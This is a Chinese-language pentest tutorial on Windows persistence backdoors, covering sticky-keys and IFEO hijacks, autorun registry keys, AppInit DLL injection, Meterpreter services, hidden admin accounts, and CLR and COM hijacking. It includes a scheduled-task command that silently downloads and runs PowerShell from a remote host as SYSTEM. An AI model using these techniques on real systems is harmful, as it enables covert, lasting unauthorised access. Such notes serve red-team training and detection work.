# BACKDOOR with 权限维持

## 1、Shift后门 

### 1、环境介绍 

环境：演示w2003/w7 

这个是比较老的方式了，在windows中有一些辅助功能，能在用户未登录系统之前可以通过组合键来启动它，类似的辅助功能有： 

C:\Windows\System32\sethc.exe 粘滞键，启动快捷键：按五次shift键 C:\Windows\System32\utilman.exe 设置中心，启动快捷键：Windows+U键 

### 2、替换后门 

在低版本的windows中，我们可以找到C:\Windows\System32\sethc.exe直接把sethc.exe替换成我们的后门程序，或者我们复制一份cmd.exe 把名字改为sethc.exe

![](../../.gitbook/assets/image%20%28349%29.png)

然后返回登陆界面多摁几次shift即可弹出cmd

![](../../.gitbook/assets/image%20%28344%29.png)

## 2、映像劫持

### 1、与shift差异

这个和shift后门差不多，只不过在低版本的windows中，我们可以简单地替换程序，但是在高版本的windows版本中替换的文件受到了系统的保护，所以这里我们要使用另外一个知识点：映像劫持。 

"映像劫持"，也被称为"IFEO"（Image File Execution Options） 简单来说就是当目标程序被映像劫持时，当我们启动目标程序时，启动的是替换后的程序而不是原来的程序 

在注册表的HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Image File Execution Option下添加一个项sethc.exe，然后在sethc.exe这个项中添加debugger键，键值为我们恶意程序的路径

![](../../.gitbook/assets/image%20%28307%29.png)

### 2、效果图

![](../../.gitbook/assets/image%20%28313%29.png)

## 3、注册表自启动项

### 1、修改注册表 

MSF的Persistence模块利用的就是写注册表自启动项来实现的，一般自启动项是这两个键：Run和RunOnce，两者的区别如下 

Run：该项下的键值即为开机启动项，每一次随着开机而启动。 

RunOnce：RunOnce和Run差不多，唯一的区别就是RunOnce的键值只作用一次，执行完毕后就会自动删除 

常见注册表启动项键的位置： 

```text
## 用户级 
\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run 
\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce 

## 系统级 
\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 
\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce 
\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run 
\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce
```

### 2、修改相应键值 

修改一下

![](../../.gitbook/assets/image%20%28285%29.png)

重启查看执行结果

![](../../.gitbook/assets/image%20%28352%29.png)

### 3、权限维持选项

在测试权限维持的过程中，一些需要用到dll进行权限维持的地方，无法进行下去，很可惜现在还不会C语言，无法编写测试dll。如果希望在Windows安全研究的更深，确实需要先对C有一定的研究

一个简单的payload eval.exe，如果被执行了会在D盘新建一个hack文件夹

```text
## eval.exe

#include "stdlib.h"

void main()
{
	system("mkdir d:\\hack");
}
```

#### 1、RunOnceEx

启动时序：用户登录时加载。 

可以启动exe、dll 

注册表位置：

```text
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx
```

使用格式参考：

```text
# EXE 自启动 

reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001 /v 1 /d "D:\evil.exe" 

# DLL 自启动 

reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "D:\evil.dll"
```

#### 2、BootExecute

启动时序：在驱动程序、系统核心加载后，由SMSS.exe进行加载。 

注册表位置：

```text
HKLM\SYSTEM\ControlSet002\Control\Session Manager\BootExecute
```

默认值：autocheck autochk \*

案例：

将值修改为：autocheck autoche \*

[https://attack.mitre.org/software/S0397/](https://attack.mitre.org/software/S0397/) 

#### 3、Startup folder

启动时序：用户登录到后。 

设置启动目录的路径，以达到自启动。 

注册表位置：

```text
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders 
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders 
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders 
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
```

#### 4、RunServices

启动时序：在登录框出现时，就会加载。 

在测试过程中测试程序没有被加载。

注册表位置：

```text
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce 
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce 
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices 
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices
```

#### 5、Explorer\Run

启动时序：用户登录到后。 

注册表位置：

```text
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run 
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run 
```

![](../../.gitbook/assets/image%20%28423%29.png)

#### 6、Winlogon\Shell

启动时序：用户登录到后。 

默认值：explorer.exe 这个用于指定登录的shell，修改后会导致资源管理器无法加载。 

注册表位置：

```text
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
```

![](../../.gitbook/assets/image%20%28399%29.png)

#### 7、AppInitDLLs / LoadAppInitDLLs

启动时序：程序调用dll时（基本所有程序都会调用系统dll），就会注入指定的dll 

注册表位置：

```text
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs
```

实验较为复杂，需要编写DLL进行注入：

https://rickgray.me/2014/08/25/the-registration-injection-of-dll-injection/



1、其实注册表注入相对远程DLL注入来说更简单、更方便一点，只需在注册表中修改AppInit\_DLLs和LoadAppInit\_DLLs的键值即可。

User32.dll被加载到进程时，会获取AppInit\_DLLs注册表项，若有值，则调用LoadLibrary\(\) API加载用户DLL。所有，DLL注册表注入，并不会影响所有进程，只会影响加载了user32.dll的进程

（下面示例过程在windows 32位下测试成功）

2、下面给出测试的DLL文件源码

```text
// MessageBox.cpp  

#include <windows.h>  
#include <tchar.h>  

#define DEF_PROCESS_NAME "cmd.exe"  // 目标进程 cmd.exe  

BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD dwReason, LPVOID lpvRevered) {  
    char szPath[MAX_PATH] = {0, };  
    char *p = NULL;  

    GetModuleFileNameA(NULL, szPath, MAX_PATH);  
    p = strrchr(szPath, '\\');  

    switch( dwReason ) {  
        case DLL_PROCESS_ATTACH:  
            if( !_stricmp(p + 1, DEF_PROCESS_NAME) )  
                MessageBox(NULL, TEXT("Hello cmd!!!"), TEXT("info"), MB_OK);  // 被进程加载时弹出MessageBox("Dll Inject Success!!!")  
            break;  
        case DLL_PROCESS_DETACH:  
            if( !_stricmp(p + 1, DEF_PROCESS_NAME) )  
                MessageBox(NULL, TEXT("Goodbye cmd!!!"), TEXT("info"), MB_OK);  // 被进程卸载时弹出MessageBox("Dll unInject Ok!!!")  
            break;  
    }  
    return TRUE;  
}
```

编译该DLL：

```text
g++ --share -o MessageBox.dll MessageBox.cpp    
#我们将MessageBox.dll文件放在d:\下面
```

该DLL被加载时，会检测进程名是否为“cmd.exe”，若为“cmd.exe”会弹出MessageBox进行相应提示。

下面我们修改注册表，来使得每次加载user32.dll时都会加载我们自己编写的MessageBox.dll

打开regedit.exe，进入如下路径。

```text
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
```

编辑修改AppInit\_DLLs表项的值为我们编译的MessageBox.dll所在的路径地址

![](../../.gitbook/assets/image%20%28426%29.png)

![](../../.gitbook/assets/image%20%28427%29.png)

然后修改LoadAppInit\_DLLs注册表项的值为1，如下图所示

![](../../.gitbook/assets/image%20%28405%29.png)

注册表项修改完毕后，重启系统，使修改生效。重启完毕后，我们呢使用Process Explorer查看MessageBox.dll是否被注入进程

![](../../.gitbook/assets/image%20%28420%29.png)

从上图可以看出，MessageBox.dll注入了部分进程，然后我们运行一下cmd.exe看是否或被注入MessageBox.dll

![](../../.gitbook/assets/image%20%28416%29.png)

从上图红色框框所标识的部分来看，运行cmd.exe时因为加载了user32.dll，所以也同时加载了我们自己写的MessageBox.dll，在DllMain\(\)运行时，检测到当前进程为“cmd.exe”因此弹出了MessageBox\(\)，说明注册表DLL注入成功。

若我们关闭cmd.exe，会弹出如下窗口  

![](../../.gitbook/assets/image%20%28406%29.png)

MessageBox.dll被cmd.exe进程成功卸载。

总结：DLL注册表注入相对与DLL远程注入来说，更加容易、方便，攻击者可以编写恶意DLL来做他任何想做的事情

## 4、定时任务

### 创建计划任务（at与schtasks）

 windows下定时任务的命令有两个分别是：at和schtasks，他们两者主要区别是at命令在win7、08等高版本的windows中是不能将任务在前台执行的，也就是只会打开一个后台进程，而schtasks是将定时的任务在前台执行，下面我们逐个看看at的一些参数

```text
AT [\\computername] time [/INTERACTIVE] [ /EVERY:date[,...] | /NEXT:date[,...]] "command"
\\computername       指定远程计算机。如果省略这个参数，会计划在本地计算机上运行命令。
id                   指定给已计划命令的识别号。
/delete              删除某个已计划的命令。如果省略 id，计算机上所有已计划的命令都会被删除。
/yes                 不需要进一步确认时，跟删除所有作业的命令一起使用。
time                 指定运行命令的时间。
/interactive         允许作业在运行时，与当时登录的用户桌面进行交互。
/every:date[,...]    指定在每周或每月的特定日期运行命令。如果省略日期，则默认为在每月的本日运行。
/next:date[,...]     指定在下一个指定日期(如，下周四)运行命令。如果省略日期，则默认为在每月的本日运行。
"command"            准备运行的 Windows NT 命令或批处理
                     程序。
```

schtasks一些参数：

```text
schtasks /create /tn TaskName /tr TaskRun /sc schedule [/mo modifier] [/d day] [/m month[,month...] [/i IdleTime] [/st StartTime] [/sd StartDate] [/ed EndDate] [/s computer [/u [domain\]user /p password]] [/ru {[Domain\]User | "System"} [/rp Password]] /?
```

schtasks的执行如下

```text
schtasks /create /tn PentestLab /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''

http://1.1.2.21:80/Zzz'''))'" /sc onlogon /ru System
```

大家可以根据需求替换里面的参数

描述:允许管理员创建、删除、查询、更改、运行和中止本地或远程系统上的计划任务。  
   
参数列表:

```text
/Create         创建新计划任务。
/Delete         删除计划任务。
/Query          显示所有计划任务。
/Change         更改计划任务属性。
/Run            按需运行计划任务。
/End            中止当前正在运行的计划任务。
/ShowSid        显示与计划的任务名称相应的安全标识符。
/?              显示此帮助消息。
```

## 5、用户登陆初始化

### 1、winlogon进程执行login scripts

Userinit的作用是用户在进行登陆初始化设置时，WinLogon进程会执行指定的login scripts，所以我们可以修改它的键值来添加我们要执行的程序 

注册表路径为：HKLM\_LOCAL\_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\Userinit，我们添加一个计算器，多个程序用逗号隔开

![](../../.gitbook/assets/image%20%28350%29.png)

![](../../.gitbook/assets/image%20%28360%29.png)

### 2、重启计算机

重启效果如下：

![](../../.gitbook/assets/image%20%28319%29.png)

## 6、Logon Scripts

### 绕过敏感操作

Logon Scripts优先于av先执行\(具体是否真的优先av没感觉出来\)，我们可以利用这一点来绕过av的敏感操作拦截 

注册表路径为：HKEY\_CURRENT\_USER\Environment，创建一个键为：UserInitMprLogonScript\(经测试名字必须是这个\)，其键值为我们要启动的程序路径

![](../../.gitbook/assets/image%20%28353%29.png)

重启效果如下

![](../../.gitbook/assets/image%20%28302%29.png)

## 7、屏幕保护程序

### 1、设置屏保开启及配置

在对方开启屏幕保护的情况下，我们可以修改屏保程序为我们的恶意程序从而达到后门持久化的目的 

其中屏幕保护的配置存储在注册表中，其位置为：HKEY\_CURRENT\_USER\Control Panel\Desktop，关键键值如下： 

```text
SCRNSAVE.EXE - 默认屏幕保护程序，我们可以把这个键值改为我们的恶意程序 
ScreenSaveActive - 1表示屏幕保护是启动状态，0表示表示屏幕保护是关闭状态 
ScreenSaverTimeout - 指定屏幕保护程序启动前系统的空闲事件，单位为秒，默认为900（15分钟）,这个可以在打开屏保的时候设置或直接在注册表设置
```

设置如下： 首先开启屏幕保护，随便选一个屏保样子

![](../../.gitbook/assets/image%20%28337%29.png)

### 2、等待屏保弹出

效果图： 我这里设置一分钟，一分钟后弹出计算器

![](../../.gitbook/assets/image%20%28303%29.png)

## 8、自启动服务

### 1、使用MSF生成木马监听上线

自启动服务一般是在电脑启动后在后台加载指定的服务程序，我们可以将exe文件注册为服务，也可以将dll文件注册为服务 

使用msf生产exe木马

![](../../.gitbook/assets/image%20%28363%29.png)

随后监听，点击exe上线

![](../../.gitbook/assets/image%20%28348%29.png)

### 2、注册服务

为了方便起见我们可以直接用Metasploit来注册一个服务 

```text
meterpreter > run metsvc -A
```

![](../../.gitbook/assets/image%20%28276%29.png)

运行之后msf会在%TMP%目录下创建一个随机名称的文件夹，然后在该文件夹C:\Users\ohh\AppData\Local\Temp\LxDpyrdEnQsvqH里面生成三个文件：metsvc.dll、metsvc-server.exe、metsvc.exe

![](../../.gitbook/assets/image%20%28335%29.png)

同时会新建一个服务，其显示名称为Meterpreter，服务名称为metsvc，启动类型为"自动"

![](../../.gitbook/assets/image%20%28340%29.png)

默认绑定在31337端口

![](../../.gitbook/assets/image%20%28321%29.png)

### 3、删除服务

如果想删除服务，可以执行 

```text
meterpreter > run metsvc -r
```

## 9、影子用户

### 1、创建隐藏用户

影子用户顾名思义就是一个隐藏用户，只能通过注册表查看这个用户，其它方式是找不到这个用户的信息的 在用户名后面加一个$可以创建一个匿名用户，创建完毕后我们再把这个用户添加到administrator组 

```text
net user test$ test /add 
net localgroup administrators test$ /add 
```

可以看到net user是看不到我们创建的用户

![](../../.gitbook/assets/image%20%28342%29.png)

但是计算机管理-用户和组中可以看到

![](../../.gitbook/assets/image%20%28358%29.png)

### 2、修改键值

所以这时候我们就需要修改一下注册表，其键位置为：HKEY\_LOCAL\_MACHINE\SAM\SAM\Domains\Account\Users 

注意：SAM键值默认是只能system权限修改的，所以我们要修改一下SAM键的权限，给予administrator完全控制和读取的权限

![](../../.gitbook/assets/image%20%28304%29.png)

然后我们将administrator用户对应的项中的F值复制到test$对应xiang中的F值，然后保存

![](../../.gitbook/assets/image%20%28364%29.png)

然后我们将test$删除掉 

```text
net user test$ /del 
```

然后再双击导出的注册表文件，然后我们再看一下

![](../../.gitbook/assets/image%20%28332%29.png)

net user和计算机管理-用户和组中都查看不到用户了，但是我们可以用net user test$查看用户信息 

这个时候我们再用net user test$ /del是删除不掉这个用户的，只能通过注册表来删除

## 10、waitfor

### 1、waitfor简介

关于waitfor手册中是这么解释的：

在系统上发送或等待信号。waitfor可用于跨网络同步计算机。 

waitfor的语法：

```text
waitfor [/s <Computer> [/u [<Domain>\]<User> [/p [<Password>]]]] /si <SignalName>
waitfor [/t <Timeout>] <SignalName>
参数解释：
/s <Computer> 指定远程计算机的名称或IP地址，默认为本地计算机
/u [<Domain>]<user> 使用指定用户帐户的凭据运行脚本。默认是使用当前用户的凭据。
/p <Password> 指定/u参数中指定的用户帐户的密码。
/si 发送指定激活信号。
/t 指定等待信号的秒数。默认为无限期等待。
<SignalName> 指定等待或发送的信号，不区分大小写，长度不能超过225个字符
```

关于waitfor更多的信息可以看一下微软提供的手册。

### 2、使用方法

我们来测试一下看看

```text
waitfor test && calc 表示接收信号成功后执行计算器
waitfor /s 192.168.163.143 /u qiyou /p qiyou /si test
```

结果如下

![](../../.gitbook/assets/image%20%28317%29.png)

 但是这样只能执行一次，这对我们后门持久化很不利，所以我们得想办法让它持久化。

这里可以借用一下三好师傅的powershell脚本：![](file:///C:\Users\73604\AppData\Roaming\Tencent\QQ\Temp\%W@GJ$ACOF%28TYDYECOKVDYB.png)https://github.com/3gstudent/Waitfor-Persistence/blob/master/Waitfor-Persistence.ps1

该方法的优点就是能主动激活，但是缺点也明显就是只能在同一网段才能接收和发送激活信号、服务器重启之后就不行了，所以不过多演示

## 11、CLR

### 1、百科简述

CLR的简述（来自百度百科） 

CLR\(公共语言运行库,Common Language Runtime\)和Java虚拟机一样也是一个运行时环境，是一个可由多种编程语言使用的运行环境。CLR的核心功能包括：内存管理、程序集加载、安全性、异常处理和线程同步，可由面向CLR的所有语言使用。并保证应用和底层操作系统之间必要的分离。CLR是.NET Framework的主要执行引 

需要注意的是CLR能够劫持系统中全部.net程序，而且系统默认会调用.net程序，从而导致我们的后门自动触发，这是我们后门持久化的一个好的思路，下面来实现一下 

修改一下注册表，注册表路径：HKEY\_CURRENT\_USER\Software\Classes\CLSID\，新建子项{11111111-1111-1111-1111-111111111111}（名字随便，只要不与注册表中存在的名称冲突就行），然后再新建子项InProcServer32，新建一个键ThreadingModel，键值为：Apartment，默认的键值为我们dll的路径

![](../../.gitbook/assets/image%20%28356%29.png)

然后在cmd下设置一下： 

**PS：要注册为全局变量，不然只能在当前cmd窗口劫持.net程序**

### 2、劫持成功

```text
SETX COR_ENABLE_PROFILING=1 /M
SETX COR_PROFILER={11111111-1111-1111-1111-111111111111} /M
```

然后执行一波，效果如下，可以看到已经成功劫持了

![](../../.gitbook/assets/image%20%28293%29.png)

## 12、Hijack CAccPropServicesClass and MMDeviceEnumerator

### 1、组对象模型

什么是COM 

组件对象模型（英语：Component Object Model，缩写COM）是微软的一套软件组件的二进制接口标准。这使得跨编程语言的进程间通信、动态对象创建成为可能。COM是多项微软技术与框架的基础，包括OLE、OLE自动化、ActiveX、COM+、DCOM、Windows shell、DirectX、Windows Runtime。 

这个和CRL劫持.NET程序类似，也是通过修改CLSID下的注册表键值，实现对CAccPropServicesClass和MMDeviceEnumerator的劫持，而系统很多正常程序启动时需要调用这两个实例，所以这个很适合我们的后门持久化。 

经测试貌似64位系统下不行（或许是我姿势的问题），但是32位系统下可以，下面说一下32位系统利用方法： 

在%APPDATA%\Microsoft\Installer{BCDE0395-E52F-467C-8E3D-C4579291692E}\下放入我们的后门dll，重命名为test.\_dl 

PS：如果Installer文件夹不存在，则依次创建Installer{BCDE0395-E52F-467C-8E3D-C4579291692E}

![](../../.gitbook/assets/image%20%28343%29.png)

### 2、修改注册表

然后就是修改注册表了，在注册表位置为：HKCU\Software\Classes\CLSID\下创建项{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}，然后再创建一个子项InprocServer32，默认为我们的dll文件路径：C:\Users\qiyou\AppData\Roaming\Microsoft\Installer{BCDE0395-E52F-467C-8E3D-C4579291692E}，再创建一个键ThreadingModel，其键值为：Apartment

![](../../.gitbook/assets/image%20%28295%29.png)

然后就是测试了，打开iexplorer.exe，成功弹框

![](../../.gitbook/assets/image%20%28368%29.png)

```text
PS：

{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}对应CAccPropServicesClass
{BCDE0395-E52F-467C-8E3D-C4579291692E}对应MMDeviceEnumerator
```

